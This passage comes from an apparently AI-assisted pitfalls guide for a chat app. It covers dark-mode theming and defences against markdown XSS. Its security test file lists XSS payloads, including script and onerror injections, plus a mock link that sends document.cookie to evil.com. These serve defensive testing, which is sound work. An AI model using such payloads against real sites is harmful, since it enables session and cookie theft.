- Third-party components (markdown, code blocks) unreadable
- Brand identity lost (SoulPrint orange invisible on dark backgrounds)
- Support tickets: "Dark mode doesn't work"

**Prevention:**

**Strategy 1: Semantic Design Tokens (Not Hard-Coded Colors)**
```css
/* styles/themes.css */
:root {
  /* Light mode (default) */
  --bg-primary: #FAFAFA;
  --bg-secondary: #FFFFFF;
  --bg-accent: #F5F5F5;

  --text-primary: #0a0a0a;
  --text-secondary: #737373;
  --text-accent: #EA580C; /* SoulPrint orange */

  --border: #E5E5E5;
  --soulprint-orange: #EA580C;
}

/* Dark mode overrides */
.dark {
  --bg-primary: #0a0a0a;
  --bg-secondary: #111111;
  --bg-accent: #1a1a1a;

  --text-primary: #FFFFFF;
  --text-secondary: #a3a3a3;
  --text-accent: #EA580C; /* Orange stays same */

  --border: #262626;
}

/* Use semantic tokens, not hard-coded colors */
.message-bubble {
  background: var(--bg-secondary);
  color: var(--text-primary);
  border: 1px solid var(--border);
}

/* BAD: Hard-coded colors */
.bad-example {
  background: #FFFFFF; /* Won't change in dark mode */
  color: #0a0a0a; /* Invisible in dark mode */
}

/* GOOD: Semantic tokens */
.good-example {
  background: var(--bg-secondary);
  color: var(--text-primary);
}
```

**Strategy 2: Systematic Color Audit and Migration**
```typescript
// scripts/audit-hard-coded-colors.ts
import { glob } from 'glob';
import fs from 'fs';

const HARD_CODED_COLOR_PATTERNS = [
  /bg-white/g,
  /bg-black/g,
  /text-gray-\d+/g,
  /text-black/g,
  /text-white/g,
  /#[0-9A-Fa-f]{6}/g, // Hex colors
  /rgb\(/g,
  /rgba\(/g
];

async function auditColors() {
  const files = await glob('**/*.{tsx,jsx,css}', {
    ignore: ['node_modules/**', '.next/**']
  });

  const violations: { file: string; line: number; pattern: string }[] = [];

  for (const file of files) {
    const content = fs.readFileSync(file, 'utf-8');
    const lines = content.split('\n');

    lines.forEach((line, idx) => {
      for (const pattern of HARD_CODED_COLOR_PATTERNS) {
        const matches = line.match(pattern);
        if (matches) {
          violations.push({
            file,
            line: idx + 1,
            pattern: matches[0]
          });
        }
      }
    });
  }

  // Report violations
  console.log(`Found ${violations.length} hard-coded color usages:`);
  violations.forEach(v => {
    console.log(`  ${v.file}:${v.line} - ${v.pattern}`);
  });

  // Suggest migrations
  console.log('\nMigration suggestions:');
  console.log('  bg-white → bg-[var(--bg-primary)]');
  console.log('  text-gray-900 → text-[var(--text-primary)]');
  console.log('  text-gray-600 → text-[var(--text-secondary)]');
}

auditColors();
```

**Strategy 3: Third-Party Component Theming**
```typescript
// components/chat/message-content.tsx
import ReactMarkdown from 'react-markdown';
import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { oneDark, oneLight } from 'react-syntax-highlighter/dist/cjs/styles/prism';

interface MessageContentProps {
  content: string;
  isDark: boolean;
}

export function MessageContent({ content, isDark }: MessageContentProps) {
  return (
    <ReactMarkdown
      components={{
        // Theme code blocks based on current theme
        code({ node, inline, className, children, ...props }) {
          const match = /language-(\w+)/.exec(className || '');
          return !inline && match ? (
            <SyntaxHighlighter
              style={isDark ? oneDark : oneLight}
              language={match[1]}
              PreTag="div"
              {...props}
            >
              {String(children).replace(/\n$/, '')}
            </SyntaxHighlighter>
          ) : (
            <code
              className={className}
              style={{
                background: isDark ? '#1a1a1a' : '#F5F5F5',
                color: isDark ? '#FFFFFF' : '#0a0a0a',
                padding: '2px 6px',
                borderRadius: '4px'
              }}
              {...props}
            >
              {children}
            </code>
          );
        },
        // Theme links
        a({ href, children }) {
          return (
            <a
              href={href}
              style={{ color: 'var(--text-accent)' }}
              className="underline hover:opacity-80"
            >
              {children}
            </a>
          );
        }
      }}
    >
      {content}
    </ReactMarkdown>
  );
}
```

**Strategy 4: Prevent Flash of Incorrect Theme (FOIT)**
```typescript
// app/layout.tsx
export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en" suppressHydrationWarning>
      <head>
        {/* Load theme BEFORE hydration to prevent flash */}
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                try {
                  const theme = localStorage.getItem('theme') ||
                    (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
                  document.documentElement.classList.toggle('dark', theme === 'dark');
                } catch (e) {}
              })();
            `
          }}
        />
      </head>
      <body className="bg-[var(--bg-primary)] text-[var(--text-primary)] transition-colors">
        {children}
      </body>
    </html>
  );
}

// lib/theme.ts (client-side toggle)
export function toggleTheme() {
  const isDark = document.documentElement.classList.contains('dark');
  const newTheme = isDark ? 'light' : 'dark';

  document.documentElement.classList.toggle('dark', newTheme === 'dark');
  localStorage.setItem('theme', newTheme);
}
```

**Strategy 5: Visual Regression Testing for Dark Mode**
```typescript
// tests/visual/dark-mode.test.ts
import { test, expect } from '@playwright/test';

test.describe('Dark Mode Visual Regression', () => {
  test('chat page renders correctly in dark mode', async ({ page }) => {
    await page.goto('http://localhost:3000/chat');

    // Toggle dark mode
    await page.click('[data-testid="theme-toggle"]');

    // Wait for transition
    await page.waitForTimeout(300);

    // Screenshot comparison
    await expect(page).toHaveScreenshot('chat-dark-mode.png', {
      fullPage: true,
      animations: 'disabled'
    });
  });

  test('no invisible text in dark mode', async ({ page }) => {
    await page.goto('http://localhost:3000/chat');
    await page.click('[data-testid="theme-toggle"]');

    // Check all text elements have sufficient contrast
    const textElements = await page.locator('p, span, div, h1, h2, h3').all();

    for (const el of textElements) {
      const color = await el.evaluate(node => {
        const styles = window.getComputedStyle(node);
        return {
          text: styles.color,
          bg: styles.backgroundColor
        };
      });

      // Verify not white-on-white or black-on-black
      expect(color.text).not.toBe('rgb(255, 255, 255)'); // No pure white text
      expect(color.bg).not.toBe('rgb(255, 255, 255)'); // No pure white bg
    }
  });
});
```

**Warning signs:**
- Hard-coded Tailwind classes like `bg-white`, `text-black`
- Inline styles with hex colors
- No CSS variable usage for colors
- Third-party components not themed
- No visual regression tests for dark mode
- Theme toggle but no system preference sync

**Phase to address:**
Phase 5: Dark Mode - Audit colors BEFORE implementing toggle

**Sources:**
- [Why Dark Mode is Mandatory in 2026 The Ultimate Design Guide](https://www.sivadesigner.in/blog/dark-mode-evolution-modern-web-design/)
- [Dark Mode in CSS Guide | CSS-Tricks](https://css-tricks.com/a-complete-guide-to-dark-mode-on-the-web/)
- [Best Practices for Dark Mode in Web Design 2026: Code Examples Included](https://natebal.com/best-practices-for-dark-mode/)

---

### Pitfall 6: Markdown XSS Vulnerabilities from User-Generated or AI-Generated Content

**What goes wrong:**
You add `react-markdown` to render AI responses with formatting (bold, lists, code blocks, links). Works beautifully for normal responses. Then: 1) User uploads ChatGPT export containing malicious markdown: `[Click me](javascript:alert('XSS'))`, 2) AI generates response with embedded `<script>` tags that `react-markdown` renders, 3) Web search results contain adversarial HTML that bypasses sanitization, 4) Code blocks execute JavaScript when syntax highlighter misconfigured, 5) Markdown tables or images from untrusted sources contain XSS payloads. User clicks link, JavaScript executes, session stolen.

**Why it happens:**
Markdown parsers convert `[link](url)` to `<a href="url">`. If url is `javascript:alert(1)`, the browser executes it. React-markdown is "secure by default" but only if used correctly - enabling `rehype-raw` (to support HTML) without `rehype-sanitize` opens XSS hole. AI-generated content is untrusted input (LLM can output arbitrary text including HTML/JS). Web search results are adversarial (attacker controls webpage content). No Content Security Policy (CSP) to block inline scripts as fallback. Developers assume "markdown is safe" without understanding parser nuances.

**Consequences:**
- XSS attack via AI-generated markdown response
- User session hijacked (localStorage/cookies stolen)
- Malicious redirect to phishing site
- Cryptominer embedded in chat response
- Violates security best practices, legal liability
- Product banned by security auditors

**Prevention:**

**Strategy 1: Sanitize with rehype-sanitize**
```typescript
// components/chat/message-content.tsx
import ReactMarkdown from 'react-markdown';
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';
import rehypeRaw from 'rehype-raw';

interface MessageContentProps {
  content: string;
  textColor?: string;
}

export function MessageContent({ content, textColor = '#000' }: MessageContentProps) {
  // Custom sanitization schema
  const sanitizeSchema = {
    ...defaultSchema,
    protocols: {
      ...defaultSchema.protocols,
      href: ['http', 'https', 'mailto'], // Block javascript: protocol
    },
    attributes: {
      ...defaultSchema.attributes,
      // Prevent event handlers
      '*': ['className', 'id'], // Only allow safe attributes
      a: ['href', 'title'],
      img: ['src', 'alt', 'title']
    },
    tagNames: [
      // Whitelist safe tags only
      'p', 'br', 'strong', 'em', 'code', 'pre',
      'ul', 'ol', 'li', 'blockquote',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'a', 'img'
      // NO script, iframe, object, embed
    ]
  };

  return (
    <ReactMarkdown
      rehypePlugins={[
        rehypeRaw, // Allow HTML (needed for some formatting)
        [rehypeSanitize, sanitizeSchema] // CRITICAL: Sanitize after raw HTML
      ]}
      components={{
        // Override link rendering for extra safety
        a({ href, children, ...props }) {
          // Block javascript: protocol
          if (href?.startsWith('javascript:')) {
            return <span style={{ color: 'red' }}>[Invalid Link]</span>;
          }

          // External links open in new tab
          return (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              style={{ color: textColor }}
              {...props}
            >
              {children}
            </a>
          );
        },

        // Safe code rendering (no eval)
        code({ node, inline, className, children, ...props }) {
          return inline ? (
            <code className={className} {...props}>
              {children}
            </code>
          ) : (
            <pre>
              <code className={className} {...props}>
                {children}
              </code>
            </pre>
          );
        }
      }}
    >
      {content}
    </ReactMarkdown>
  );
}
```

**Strategy 2: Content Security Policy (CSP) Fallback**
```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Set strict CSP to block inline scripts
  response.headers.set(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net", // Allow trusted CDNs only
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' https://*.supabase.co https://soulprint-landing.onrender.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'"
    ].join('; ')
  );

  return response;
}
```

**Strategy 3: Pre-Render Sanitization for Web Search Results**
```typescript
// lib/search/result-sanitizer.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeSearchResult(htmlContent: string): string {
  // Strip all HTML, keep only text and safe markdown
  const cleaned = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: [], // Strip all HTML tags
    KEEP_CONTENT: true, // Keep text content
    ALLOWED_ATTR: []
  });

  return cleaned;
}

// In chat API route
async function fetchWebSearch(query: string) {
  const results = await tavily.search({ query });

  // Sanitize each result before passing to LLM
  const sanitizedResults = results.map(result => ({
    ...result,
    snippet: sanitizeSearchResult(result.snippet),
    content: result.content ? sanitizeSearchResult(result.content) : undefined
  }));

  return sanitizedResults;
}
```

**Strategy 4: Security Testing for XSS**
```typescript
// tests/security/xss.test.ts
describe('Markdown XSS Prevention', () => {
  const xssPayloads = [
    '[Click me](javascript:alert(1))',
    '<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>',
    '[XSS](javascript:void(document.cookie))',
    '![XSS](javascript:alert(1))',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<svg onload=alert(1)>'
  ];

  for (const payload of xssPayloads) {
    test(`blocks XSS payload: ${payload}`, async () => {
      render(<MessageContent content={payload} />);

      // Verify no script execution
      expect(window.alert).not.toHaveBeenCalled();

      // Verify no javascript: links in DOM
      const links = screen.queryAllByRole('link');
      for (const link of links) {
        expect(link.getAttribute('href')).not.toMatch(/^javascript:/);
      }

      // Verify no script tags in DOM
      const scripts = document.querySelectorAll('script');
      expect(scripts.length).toBe(0);
    });
  }

  test('sanitizes AI-generated malicious markdown', async () => {
    // Mock AI response with XSS attempt
    const maliciousResponse = `Here's a helpful link: [Click me](javascript:fetch('https://evil.com?cookies='+document.cookie))`;

    const { container } = render(<MessageContent content={maliciousResponse} />);

    // Verify link is either removed or href sanitized
    const link = container.querySelector('a');
    if (link) {
      expect(link.href).not.toContain('javascript:');
    }
  });
});
```

**Warning signs:**
- `react-markdown` used without `rehype-sanitize`
- `rehype-raw` enabled (allows HTML) without sanitization
- Web search results inserted into markdown without cleaning
- No Content Security Policy headers
- Links don't check for `javascript:` protocol
- No XSS testing in security suite

**Phase to address:**
Phase 6: Markdown Rendering - Security audit BEFORE GA

**Sources:**
- [Secure Markdown Rendering in React: Balancing Flexibility and Safety | HackerOne](https://www.hackerone.com/blog/secure-markdown-rendering-react-balancing-flexibility-and-safety)
- [Avoiding XSS via Markdown in React | javascript-security | Medium](https://medium.com/javascript-security/avoiding-xss-via-markdown-in-react-91665479900)
- [React Markdown Complete Guide 2025: Security & Styling Tips](https://strapi.io/blog/react-markdown-complete-guide-security-styling)

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Add conversation_id with default value (skip inference) | Fast migration (1 query) | All old messages lumped into "default" conversation, users confused | NEVER - infer conversations from time gaps |
| Stream without timeout protection | Simpler code | Random failures on long responses in production | Only in dev (add before production) |
| Skip citation validation | Ship web search faster | Users click broken links, trust collapses | NEVER - validate before display |
| No recording duration limit | Simpler UX (unlimited recording) | Transcription costs explode ($600+/month) | Only in private beta (<10 users) |
| Skip color audit, use .dark class only | Fast dark mode implementation | Half the UI invisible in dark mode | NEVER - audit colors first |
| react-markdown without rehype-sanitize | Cleaner code (fewer dependencies) | XSS vulnerability, security incident | NEVER - always sanitize untrusted content |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Multi-conversation migration | Adding conversation_id without backfilling existing data | Create default conversation per user, backfill old messages |
| Vercel streaming | Missing `runtime: 'nodejs'` and `dynamic: 'force-dynamic'` exports | Add exports to enable true streaming, test in preview deployment |
| Web search citations | Passing raw search results to LLM, allowing URL fabrication | Use structured [SOURCE_X] format, validate citations post-generation |
| Voice recording | Only testing on Chrome desktop | Test on Safari iOS (50% mobile users), handle MIME type differences |
| Dark mode | Hard-coded colors (bg-white, text-black) | Use CSS variables (--bg-primary, --text-primary) throughout |
| Markdown rendering | Using rehype-raw without rehype-sanitize | Always sanitize after raw HTML, block javascript: protocol |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Loading all conversations on mount | Chat page slow to load (5s+) | Paginate conversations, load last 10 only | >50 conversations per user |
| Streaming without buffering | Single-character chunks cause UI thrashing | Buffer chunks (100ms), batch state updates | Streaming >100 chars/sec |
| Transcribing long voice recordings synchronously | UI frozen during 10s+ transcription | Show progress bar, run in background with loading state | Recordings >1 minute |
| Fetching full conversation history for search | Web search with 10k token history times out | Send only last 5 messages + current query | Conversations >100 turns |
| Re-rendering all messages on theme toggle | UI lag when toggling dark mode | Memoize message components, use CSS variables not JS | >100 messages on screen |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| No RLS policy on conversations table | User can view other users' conversations via direct query | Add RLS: `auth.uid() = user_id` |
| Streaming API endpoint not rate-limited | Attacker floods server with long-running streams, exhausts resources | Rate limit to 10 concurrent streams per user |
| Web search URLs not validated | XSS via `[link](javascript:alert(1))` in AI response | Validate URLs, block javascript: protocol |
| Voice transcription files not deleted | Audio recordings stored in /tmp forever, disk fills up | Delete temp files after transcription |
| No CSP headers | Markdown XSS bypasses sanitization, executes inline scripts | Set strict CSP: script-src 'self' only |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| No "switching conversations" indicator | User confused why message sent to wrong conversation | Show conversation title in header, confirmation on switch |
| Streaming without "generating" indicator | User thinks app froze, clicks send again (duplicate requests) | Show "AI is typing..." with animated dots |
| No web search progress feedback | 10s wait for search feels broken | Show "Searching the web..." with spinner |
| Voice recording without duration display | User doesn't know how long they've recorded | Show timer: "Recording: 42s / 120s" |
| Theme toggle without transition | Harsh flash when switching themes | CSS transition: `transition-colors duration-300` |
| Raw markdown errors shown to user | User sees `[SyntaxError: Unexpected token]` in chat | Catch markdown parse errors, show "Formatting error" |

## "Looks Done But Isn't" Checklist

- [ ] **Multi-conversation:** Often missing RLS policies on conversations table, missing conversation_id index, no conversation title inference
- [ ] **Streaming:** Often missing runtime/dynamic exports, no timeout protection, client doesn't handle stream interruptions
- [ ] **Web search:** Often missing citation validation, no hallucination detection, URLs not checked for javascript: protocol
- [ ] **Voice input:** Often missing MIME type compatibility check, no duration limit, no cost tracking, iOS Safari not tested
- [ ] **Dark mode:** Often missing color audit, hard-coded colors remain, third-party components not themed, FOIT on page load
- [ ] **Markdown:** Often missing rehype-sanitize, XSS testing skipped, no CSP headers, code blocks allow JavaScript execution

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Lost messages from conversation migration | HIGH | 1. Rollback migration 2. Infer conversations from timestamps 3. Create conversations table 4. Backfill with batch script 5. Notify affected users |
| Streaming buffered in production | LOW | 1. Add runtime/dynamic exports 2. Test in preview deployment 3. Deploy fix |
| Citation hallucinations | MEDIUM | 1. Add citation validation 2. Regenerate responses with validation 3. Add disclaimer to old messages |
| Voice transcription cost spike | MEDIUM | 1. Add duration limits immediately 2. Alert users of 2min limit 3. Monitor costs daily |
| Dark mode invisible text | LOW | 1. Audit hard-coded colors 2. Migrate to CSS variables 3. Test visually 4. Deploy hotfix |
| Markdown XSS vulnerability | HIGH | 1. Add rehype-sanitize immediately 2. Regenerate affected messages 3. Incident response if exploited 4. Add CSP headers |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Multi-conversation data loss | Phase 1: Database Migration | All existing messages have conversation_id, no orphaned messages, RLS tests pass |
| Streaming buffering | Phase 2: Streaming Setup | Chunks arrive incrementally in production, first chunk <3s, no timeouts on long responses |
| Citation hallucinations | Phase 3: Search Integration | Citation validation catches 100% of test payloads, no hallucinated URLs in production logs |
| Voice compatibility issues | Phase 4: Voice Input | Works on Safari iOS, Chrome, Firefox; MIME type auto-selected; duration limits enforced |
| Dark mode invisible text | Phase 5: Theme System | Visual regression tests pass, all text readable in both themes, no hard-coded colors in audit |
| Markdown XSS | Phase 6: Rendering Security | XSS test suite passes (0 vulnerabilities), rehype-sanitize enabled, CSP blocks inline scripts |

## Sources

- [How to Design a Database Schema for a Real-Time Chat & Messaging App?](https://www.back4app.com/tutorials/how-to-design-a-database-schema-for-a-real-time-chat-and-messaging-app)
- [Fixing Slow SSE (Server-Sent Events) Streaming in Next.js and Vercel](https://medium.com/@oyetoketoby80/fixing-slow-sse-server-sent-events-streaming-in-next-js-and-vercel-99f42fbdb996)
- [Vercel Functions Limits](https://vercel.com/docs/functions/limitations)
- [Understanding and Avoiding Hallucinated References - The WAC Clearinghouse](https://wacclearinghouse.org/repository/collections/continuing-experiments/august-2025/ai-literacy/understanding-avoiding-hallucinated-references/)
- [GPTZero uncovers 50+ Hallucinations in ICLR 2026](https://gptzero.me/news/iclr-2026/)
- [Web Audio API | Can I use... Support tables](https://caniuse.com/audio-api)
- [Cross Browser Compatibility Score of Web Audio API](https://www.lambdatest.com/web-technologies/audio-api)
- [Whisper API Pricing 2026: $0.006/min Real Cost Breakdown](https://brasstranscripts.com/blog/openai-whisper-api-pricing-2025-self-hosted-vs-managed)
- [Why Dark Mode is Mandatory in 2026 The Ultimate Design Guide](https://www.sivadesigner.in/blog/dark-mode-evolution-modern-web-design/)
- [Dark Mode in CSS Guide | CSS-Tricks](https://css-tricks.com/a-complete-guide-to-dark-mode-on-the-web/)
- [Best Practices for Dark Mode in Web Design 2026: Code Examples Included](https://natebal.com/best-practices-for-dark-mode/)
- [Secure Markdown Rendering in React: Balancing Flexibility and Safety | HackerOne](https://www.hackerone.com/blog/secure-markdown-rendering-react-balancing-flexibility-and-safety)
- [Avoiding XSS via Markdown in React | javascript-security | Medium](https://medium.com/javascript-security/avoiding-xss-via-markdown-in-react-91665479900)
- [React Markdown Complete Guide 2025: Security & Styling Tips](https://strapi.io/blog/react-markdown-complete-guide-security-styling)

---

*Pitfalls research for: SoulPrint Full Chat Experience*
*Researched: 2026-02-08*
*Confidence: HIGH*
